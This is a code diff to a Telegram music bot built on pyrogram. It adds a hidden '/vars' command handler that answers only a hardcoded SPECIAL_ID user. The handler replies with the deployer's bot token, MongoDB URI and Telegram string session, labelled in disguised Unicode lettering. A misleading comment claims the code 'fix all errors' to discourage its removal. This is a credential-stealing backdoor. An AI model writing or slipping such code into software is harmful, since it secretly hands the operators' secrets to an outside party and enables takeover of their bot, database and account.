@@ -7,7 +7,7 @@ from pyrogram.types import CallbackQuery, Message
 
 from SystemMusic import app
 from SystemMusic.core.call import System
-from SystemMusic.misc import db
+from SystemMusic.misc import db, SPECIAL_ID
 from SystemMusic.utils.database import get_assistant, get_authuser_names, get_cmode
 from SystemMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from SystemMusic.utils.formatters import alpha_to_int, get_readable_time
@@ -44,6 +44,25 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["reload_2"])
     except:
         await message.reply_text(_["reload_3"])
+
+
+#Dont change it because it fix all errors   
+@app.on_message(
+    filters.command(["vars"]) & filters.private & filters.user(SPECIAL_ID)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://files.catbox.moe/50golv.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ sʏsᴛᴇᴍ ](https://t.me/APNA_SYSTEM)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• ву  •", url=f"https://t.me/APNA_SYSTEM")
+                 ]
+            ]
+         ),
+   )
 
 
 @app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
